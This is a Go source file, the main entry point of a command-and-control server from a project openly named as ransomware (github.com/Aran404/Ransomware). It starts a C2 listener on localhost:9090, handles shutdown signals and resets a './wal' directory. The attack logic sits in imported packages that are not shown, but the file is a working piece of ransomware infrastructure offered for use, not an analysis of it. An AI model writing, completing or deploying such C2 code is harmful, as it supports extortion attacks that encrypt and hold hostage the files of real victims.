package main

import (
	"context"
	"log"
	"os"
	"os/signal"
	"sync"
	"syscall"

	"github.com/Aran404/Ransomware/c2/server"
	"github.com/Aran404/Ransomware/c2/types"
)

func cleanup(c *server.Client) {
	c.Close(context.Background())
	_ = os.RemoveAll("./wal")
	if err := os.Mkdir("./wal", 0755); err != nil {
		log.Fatalf("Could not create /wal directory. Error: %v", err)
	}
}

func init() {
	types.Clear()
	types.SetTitle("Command & Control Center - Ransomware | github.com/Aran404/Ransomware")
}

func main() {
	log.Println("Starting Command & Control Center >> localhost:9090")
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	once := sync.Once{}
	c := server.NewClient(ctx)
	defer once.Do(func() { cleanup(c) })

	sigChan := make(chan os.Signal)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func(c *server.Client) {
		<-sigChan
		once.Do(func() { cleanup(c) })
		os.Exit(1)
	}(c)

	c.Listen()
}
